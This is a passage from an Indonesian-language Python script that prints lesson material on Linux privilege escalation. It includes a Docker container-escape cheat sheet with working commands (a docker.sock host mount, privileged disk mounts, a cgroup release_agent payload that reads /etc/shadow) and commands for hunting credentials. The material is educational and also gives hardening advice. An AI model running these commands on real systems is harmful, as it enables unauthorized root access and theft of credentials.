        ("Privileged Mode Escape",  "--privileged → akses penuh device host",        "Kontainer privileged"),
        ("Capabilities Abuse",      "CAP_SYS_ADMIN → mount host filesystem",          "Capabilities tidak dibatasi"),
        ("ProcFS Breakout",         "Mount host /proc → chroot via /proc/1/root",    "Host /proc termount di kontainer"),
        ("Cgroup Escape",           "Eksploitasi cgroup untuk escape kontainer",     "cgroup v1 + notifier hack"),
        ("NSENTER Wrapper",         "Gunakan nsenter untuk join host namespace",     "CAP_SYS_ADMIN + host PID"),
        ("Release Agent Escape",    "Release agent cgroup → execute command host",   "Write cgroup + notify_on_release"),
        ("SYS_PTRACE Escape",       "Ptrace proses host → inject shellcode",         "CAP_SYS_PTRACE + host PID"),
    ]
    for e in escapes:
        print(f"  {e[0]:<35} {e[1]:<55} {e[2]:<25}")

    print()

    print("  🔥 DOCKER ESCAPE CHEAT SHEET:")
    print()
    print("     # Cek apakah di dalam Docker:")
    print("     cat /proc/1/cgroup | grep -i docker")
    print("     ls -la / | grep -i docker")
    print()
    print("     # Jika ada akses docker socket:")
    print("     docker run -v /:/mnt -it --privileged alpine chroot /mnt")
    print()
    print("     # Jika privileged mode:")
    print("     fdisk -l")
    print("     mkdir /mnt-host && mount /dev/sda1 /mnt-host")
    print("     chroot /mnt-host")
    print()
    print("     # Jika CAP_SYS_ADMIN:")
    print("     mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp")
    print("     mkdir /tmp/cgrp/x")
    print("     echo 1 > /tmp/cgrp/x/notify_on_release")
    print("     echo '#!/bin/sh' > /tmp/payload && echo 'cat /etc/shadow' >> /tmp/payload")
    print("     chmod +x /tmp/payload")
    print("     chmod 777 /tmp/payload")
    print()

    print("""
  💡 FILOSOFI: Kontainer bukanlah security boundary yang kuat!
     Kernel sharing = potensi escape. Selalu gunakan:
     • User namespace
     • Seccomp profile
     • AppArmor/SELinux
     • Read-only root filesystem
     • Non-root user di dalam kontainer
    """)


# ── [12] Analogi ──
def analogi():
    section(12, "ANALOGI TAMU HOTEL DAPET KUNCI MANAJER")

    print("""
   ╔══════════════════════════════════════════════════════════╗
   ║  🏨 ANALOGI HOTEL — PRIVILEGE ESCALATION               ║
   ║                                                        ║
   ║  Kamu = TAMU di lantai 2 (user www-data)               ║
   ║                                                        ║
   ║  🔑 SUDAH PUNYA:                                      ║
   ║     • Kunci kamar sendiri (akses terbatas)              ║
   ║     • Bisa jalan-jalan di koridor (limited command)     ║
   ║                                                        ║
   ║  🎯 TUJUAN: DAPET KUNCI MANAJER (ROOT)!                ║
   ║                                                        ║
   ║  🔓 CARA-CARA PRIVESC:                                 ║
   ║                                                        ║
   ║  1. SUID BINARY = Kunci cadangan yang salah taruh:      ║
   ║     Ada kunci manajer yang nyantol di tembok koridor!   ║
   ║     ➜ find / -perm -4000                               ║
   ║                                                        ║
   ║  2. SUDO ABUSE = Minta izin satpam buat akses ruangan:  ║
   ║     "Bang satpam, tolong bukain ruang gudang ya"        ║
   ║     ➜ sudo -l (lihat apa yang dizinkan)                ║
   ║                                                        ║
   ║  3. CRON JOB = Task pembersihan kamar otomatis:          ║
   ║     Ada cleaner yang masuk tiap jam — ubah jadwalnya!   ║
   ║     ➜ /etc/crontab writable?                           ║
   ║                                                        ║
   ║  4. PASSWORD HUNTING = Cari catatan di meja:             ║
   ║     "Password Wi-Fi: admin123" nempel di monitor!       ║
   ║     ➜ grep -r password /etc/                           ║
   ║                                                        ║
   ║  5. KERNEL EXPLOIT = Bobol dinding kamar ke ruang lain:  ║
   ║     Ada retakan di dinding yang bisa diperbesar!         ║
   ║     ➜ CVE sesuai versi kernel                          ║
   ║                                                        ║
   ║  6. DOCKER ESCAPE = Kabur dari hotel ke kota:            ║
   ║     Kamu di hotel transit, tapi bisa kabur ke luar!      ║
   ║     ➜ Cek /var/run/docker.sock                         ║
   ║                                                        ║
   ║  📌 RESUME: DARI TAMU LANTAI 2 → PEGANG KUNCI HOTEL!  ║
   ╚══════════════════════════════════════════════════════════╝
    """)


# ── Main ──
def main():
    banner()

    # ── [1] User Info ──
    user_info()

    # ── [2] OS & Kernel Info ──
    os_info()

    # ── [3] SUID Binaries ──
    suid_binaries()

    # ── [4] SUDO Abuse ──
    sudo_abuse()

    # ── [5] Cron Jobs ──
    cron_jobs()

    # ── [6] Network & Services ──
    network_services()

    # ── [7] Password Hunting ──
    password_hunting()

    # ── [8] Capabilities ──
    capabilities()

    # ── [9] Incident Response ──
    incident_response()

    # ── [10] Persistence Detection ──
    persistence_detection()

    # ── [11] Docker Escape ──
    docker_escape()

    # ── [12] Analogi ──
    analogi()

    # ── Summary ──
    print("=" * 60)
    print("  ✅ SESI 21 SELESAI!")
    print("=" * 60)
    print("  👉 Recap:")
    print("    • User Info: whoami, id, sudo -l, groups — kenali siapa kamu")
    print("    • OS/Kernel: uname -a, cari CVE sesuai versi kernel")
    print("    • SUID: find / -perm -4000 — binary jalan sebagai owner")
    print("    • SUDO: sudo -l — cari command berbahaya di sudoers")
    print("    • Cron: /etc/crontab, /etc/cron.d/ — task root terjadwal")
    print("    • Network: ss -tlnp, lsof -i — service listening di host")
    print("    • Password: grep -r password, .bash_history, config files")
    print("    • Capabilities: getcap -r / — granular privilege binary")
    print("    • Incident Response: 6 fase — identifikasi s.d. lessons learned")
    print("    • Persistence: SSH keys, cron, systemd, web shell, kernel module")
    print("    • Docker Escape: socket, privileged, cgroup, procfs breakout")
    print()
    print("  📌 LATIHAN LANJUTAN:")
    print("    1. Cek user: whoami && id && sudo -l 2>/dev/null")
    print("    2. Cek SUID: find / -perm -4000 -type f 2>/dev/null | head -20")
    print("    3. Cek capabilities: getcap -r / 2>/dev/null | head -20")
    print("    4. Cek cron: cat /etc/crontab 2>/dev/null")
    print("    5. Cek network: ss -tlnp 2>/dev/null || netstat -tulpn")
    print("    6. Cek history: history | grep -E '(pass|sudo|ssh)'")
    print("    7. Cek kernel: uname -a → search CVE di Google")
    print("    8. Cek Docker: cat /proc/1/cgroup | grep -i docker")
    print("    9. Cek SSH keys: ls -la ~/.ssh/")
    print("    10. Cek process: ps aux --sort=-%mem | head -15")
    print("    11. Cek auth log: tail -20 /var/log/auth.log (if readable)")
    print("    12. Baca GTFOBins untuk referensi exploit SUID/SUDO")
    print("    13. Baca: https://gtfobins.github.io")
    print("    14. Baca: Linux Privesc Cheatsheet di PayloadsAllTheThings")
    print("    15. Praktik: Coba exploit SUID python di lab sendiri")
    print("=" * 60)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
